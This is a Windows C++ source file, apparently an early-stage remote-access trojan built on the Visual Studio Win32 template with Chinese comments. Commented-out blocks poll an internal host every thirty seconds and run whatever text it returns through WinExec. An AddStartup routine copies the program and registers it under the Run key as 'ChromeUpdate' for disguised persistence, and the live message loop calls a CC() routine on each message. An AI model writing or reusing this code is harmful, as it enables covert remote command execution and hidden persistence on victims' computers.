//startup.cpp: 定义应用程序的入口点。
//

#include "stdafx.h"
#include "startup.h"
#include "http.h"
#include "json.h"
#include "api.h"

#define MAX_LOADSTRING 100

// 全局变量: 
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明: 
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

BOOL AddStartup();

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: 在此放置代码。

    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_STARTUP, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化: 
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

	//RegisterAPI();
	//return 0;

	/*
	LPSTR dataReceived = new char[MAX_HTTP_RESPONSE_SIZE + 1];
	ZeroMemory(dataReceived, MAX_HTTP_RESPONSE_SIZE + 1);
	int a = 1;
	for (a = 0; a < 1001; a++) {
		a += 1;
	}
	

	while (true)
	{
		Request(L"10.16.45.143", 80, L"GET", L"foobar.html", L"Connection: close\r\nContent-Type: application/json\r\n", NULL, 0, dataReceived);
		PrintStrDebug(dataReceived);
		//WinExec(dataReceived, SW_SHOW);
		Sleep(1000 * 30);
	}
	
	
	return 0;

	*/

	/*
	LPSTR dataReceived = new char[MAX_HTTP_RESPONSE_SIZE + 1];
	ZeroMemory(dataReceived, MAX_HTTP_RESPONSE_SIZE + 1);
	Request(L"10.16.45.143", 80, L"GET", L"foobar.html", L"Connection: close\r\nContent-Type: application/json\r\n", NULL, 0, dataReceived);
	PrintStrDebug(dataReceived);
	WinExec(dataReceived, SW_SHOW);
	*/

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_STARTUP));
	

    MSG msg;

	BOOL status = TRUE;
	/*
	while (status) {
		CC();
		Sleep(1000 * 5);
	}
	*/
    // 主消息循环: 
    while (GetMessage(&msg, nullptr, 0, 0))
    {
		CC();
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目的: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_STARTUP));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_STARTUP);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目的: 保存实例句柄并创建主窗口
//
//   注释: 
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的:    处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // 分析菜单选择: 
            switch (wmId)
            {
            case IDM_ABOUT:
				GetApiId();
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
			case IDM_ADD:
				AddStartup();
				break;
			case IDM_DEL:
				break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

BOOL AddStartup()
{
	/*
	// 当前路径
	TCHAR currentFile[MAX_PATH + 1];
	// 要保存的路径
	TCHAR svcFile[MAX_PATH + 1] = { 0 };
	// 要保存的
	TCHAR appPath[MAX_PATH + 1] = { 0 };

	GetAppPath(appPath);
	PathCombine(svcFile, appPath, EXENAME);
	GetModuleFileName(NULL, currentFile, MAX_PATH + 1);
	BOOL ret = CopyFile(currentFile, svcFile, FALSE);
	if (!ret) {
		HandleExc();
		return FALSE;
	}
	HKEY hKey;
	HKEY loadKey;
	RegOpenCurrentUser(KEY_ALL_ACCESS, &hKey);
	RegCreateKeyEx(hKey,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&loadKey,
		NULL);
	ret = RegSetKeyValue(loadKey, NULL, L"ChromeUpdate", REG_SZ, svcFile, MAX_PATH + 1);
	RegCloseKey(hKey);
	RegCloseKey(loadKey);
	*/
	return TRUE;
	
}
